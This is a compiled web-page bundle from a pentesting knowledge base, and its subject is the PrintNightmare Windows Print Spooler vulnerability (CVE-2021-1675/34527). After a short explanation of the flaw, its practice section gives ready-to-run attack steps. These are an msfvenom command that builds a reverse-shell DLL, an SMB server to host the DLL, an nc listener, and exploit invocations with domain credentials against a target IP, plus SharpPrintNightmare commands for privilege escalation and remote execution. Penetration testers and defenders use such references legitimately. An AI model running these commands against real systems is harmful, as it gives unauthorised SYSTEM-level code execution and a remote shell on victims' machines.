import{_ as h,c as o,a5 as p,G as s,w as a,j as e,a as t,B as n,o as c}from"./chunks/framework.B5CpDqM0.js";const d="/assets/PrintNightmare_MS-RPRN.Ccc_CLHZ.jpeg",f=JSON.parse('{"title":"PrintNightmare","description":"CVE-2021-1675 & CVE-2021-34527","frontmatter":{"description":"CVE-2021-1675 & CVE-2021-34527","authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/print-spooler-service/printnightmare.md","filePath":"ad/movement/print-spooler-service/printnightmare.md","lastUpdated":1724982529000}'),k={name:"ad/movement/print-spooler-service/printnightmare.md"};function m(g,i,u,b,y,E){const r=n("PluginTabsTab"),l=n("PluginTabs");return c(),o("div",null,[i[2]||(i[2]=p('<h1 id="printnightmare" tabindex="-1">PrintNightmare <a class="header-anchor" href="#printnightmare" aria-label="Permalink to &quot;PrintNightmare&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><h3 id="the-print-spooler" tabindex="-1">The print spooler <a class="header-anchor" href="#the-print-spooler" aria-label="Permalink to &quot;The print spooler&quot;">​</a></h3><p>The Print Spooler is a Microsoft built-in service that manages printing jobs. It is enabled by default and runs within the <code>SYSTEM</code> context.</p><p>3 RPC protocols are registered by the spooler:</p><ul><li>MS-RPRN: Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server synchronously.</li><li>MS-PAR: Microsoft’s Print System Asynchronous Remote Protocol. It has the same functionalities as MS-RPRN, but works asynchronously.</li><li>MS-PAN: Microsoft’s Print System Asynchronous Notification Protocol. It is used to receive print status notifications from a print server and to send server-requested responses to those notifications back to the server.</li></ul><h3 id="printnightmare-1" tabindex="-1">PrintNightmare <a class="header-anchor" href="#printnightmare-1" aria-label="Permalink to &quot;PrintNightmare&quot;">​</a></h3><p>&quot;PrintNightmare&quot; refers to an RCE (Remote Command Execution) vulnerability. If the vulnerable machine is configured to reject remote connection, this vulnerability could still be exploited in an LPE (Local Privilege Escalation) context.</p><p>In a detailed blogpost (<a href="https://cyberwatch.fr/actualite/cve-2021-34527-comment-identifier-et-neutraliser-la-vulnerabilite-printnightmare/" target="_blank" rel="noreferrer">here</a>), Cyberwatch describes that the vulnerability lies in the functions allowing remote driver installation by users, <code>RpcAddPrinterDriverEx</code> and <code>RpcAddPrinterDriver</code>:</p><ol><li>The attacker stores the driver DLL file on a SMB share reachable from the server.</li><li>The client creates a <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2" target="_blank" rel="noreferrer"><code>DRIVER_INFO_2</code></a> object containing the path to the attacker&#39;s DLL and passes it into the DRIVER_CONTAINER object.</li><li>The client calls <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b" target="_blank" rel="noreferrer"><code>RpcAddPrinterDriverEx</code></a> with the <code>DRIVER_CONTAINER</code> to load the attacker&#39;s DLL into the server&#39;s dynamic library and with multiple bit values within the <code>dwFileCopyFlags</code> in order to bypass the <code>SeLoadDriverPrivilege</code> privilege verification by the server.</li><li>The attacker&#39;s DLL is executed on the server within <code>SYSTEM</code> context.</li></ol><h3 id="constraints" tabindex="-1">Constraints <a class="header-anchor" href="#constraints" aria-label="Permalink to &quot;Constraints&quot;">​</a></h3><p>As <a href="https://twitter.com/StanHacked/" target="_blank" rel="noreferrer">@StanHacked</a> stated on Twitter, there are some constraints depending on the protocol used for the attack.</p><h4 id="ms-rprn-conditional-tree" tabindex="-1">MS-RPRN conditional tree <a class="header-anchor" href="#ms-rprn-conditional-tree" aria-label="Permalink to &quot;MS-RPRN conditional tree&quot;">​</a></h4><p><img src="'+d+'" alt=""></p><p><a href="https://twitter.com/StanHacked/status/1410929974358515719" class="caption" target="_blank" rel="noreferrer">https://twitter.com/StanHacked/status/1410929974358515719</a></p><h4 id="ms-par-conditional-tree" tabindex="-1">MS-PAR conditional tree <a class="header-anchor" href="#ms-par-conditional-tree" aria-label="Permalink to &quot;MS-PAR conditional tree&quot;">​</a></h4><p><a href="./assets/PrintNightmare_MS-PAR.jpeg"></a></p><p><a href="https://twitter.com/StanHacked/status/1412060814488608773" class="caption" target="_blank" rel="noreferrer">https://twitter.com/StanHacked/status/1412060814488608773</a></p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2>',19)),s(l,null,{default:a(()=>[s(r,{label:"UNIX-like"},{default:a(()=>i[0]||(i[0]=[e("p",null,"From Unix-like systems, the attack can be conducted as follows",-1),e("ol",null,[e("li",null,[t("Check if the target's RPC pipes are available: Impacket's "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py",target:"_blank",rel:"noreferrer"},"rpcdump.py")]),e("li",null,[t("Generate a DLL payload: "),e("a",{href:"https://github.com/rapid7/metasploit-framework/blob/master/msfvenom",target:"_blank",rel:"noreferrer"},"msfvenom")]),e("li",null,[t("Host an SMB server from which the DLL can be fetched: Impacket's "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py",target:"_blank",rel:"noreferrer"},"smbserver.py")]),e("li",null,[t("Exploit PrintNightmare: CVE-2021-1675.py ("),e("a",{href:"https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare",target:"_blank",rel:"noreferrer"},"MS-RPRN abuse"),t(", "),e("a",{href:"https://github.com/cube0x0/CVE-2021-1675/blob/main/SharpPrintNightmare/CVE-2021-1675.py",target:"_blank",rel:"noreferrer"},"MS-PAR abuse"),t(")")]),e("li",null,"Profit from the DLL being executed by the target")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Check open pipes")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"rpcdump.py"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," @192.168.1.16"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," egrep"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'MS-RPRN|MS-PAR'")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Create a DLL payload (reverse shell in this example)")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"msfvenom"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -f"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dll"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," windows/x64/shell_reverse_tcp"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," LHOST="),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$LOCAL_IP "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"LPORT="),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$LOCAL_PORT "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-o"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /workspace/smb/remote.dll")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Host a SMB share ")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbserver.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -smb2support"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "WHATEVERNAME"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /workspace/smb/")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Start the listener (for the reverse shell)")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"nc"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -lvnp"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $LOCAL_PORT")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Run the exploit")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"CVE-2021-1675.py"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TARGET_IP "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'\\\\$LOCAL_IP\\$SHARE\\remote.dll'")])])])],-1)])),_:1}),s(r,{label:"Windows"},{default:a(()=>i[1]||(i[1]=[e("p",null,[t("From Windows systems, the attack can be conducted in an LPE or RCE context with the following PoC: "),e("a",{href:"https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare",target:"_blank",rel:"noreferrer"},"https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare"),t(".")],-1),e("div",{class:"caution custom-block"},[e("p",null,[e("em",null,"At the time of writing, October 7th 2022, the Windows abuse technique has not been tested by THR's authors.")])],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"#LPE")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"C:\\SharpPrintNightmare.exe"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," C:"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\a"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"ddCube.dll")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"#RCE using existing context")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"SharpPrintNightmare.exe"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\$LOCAL_IP\\smb\\addCube.dll'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\$TARGET_IP'")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"#RCE using runas /netonly")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"SharpPrintNightmare.exe"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\$LOCAL_IP\\smb\\addCube.dll'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\$TARGET_IP'"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN $USER $PASSWORD")])])])],-1)])),_:1})]),_:1}),i[3]||(i[3]=e("h2",{id:"resources",tabindex:"-1"},[t("Resources "),e("a",{class:"header-anchor",href:"#resources","aria-label":'Permalink to "Resources"'},"​")],-1)),i[4]||(i[4]=e("p",null,[e("a",{href:"https://cyberwatch.fr/actualite/cve-2021-34527-comment-identifier-et-neutraliser-la-vulnerabilite-printnightmare/",target:"_blank",rel:"noreferrer"},"https://cyberwatch.fr/actualite/cve-2021-34527-comment-identifier-et-neutraliser-la-vulnerabilite-printnightmare/")],-1)),i[5]||(i[5]=e("p",null,[e("a",{href:"https://github.com/cube0x0/CVE-2021-1675",target:"_blank",rel:"noreferrer"},"https://github.com/cube0x0/CVE-2021-1675")],-1))])}const C=h(k,[["render",m]]);export{f as __pageData,C as default};
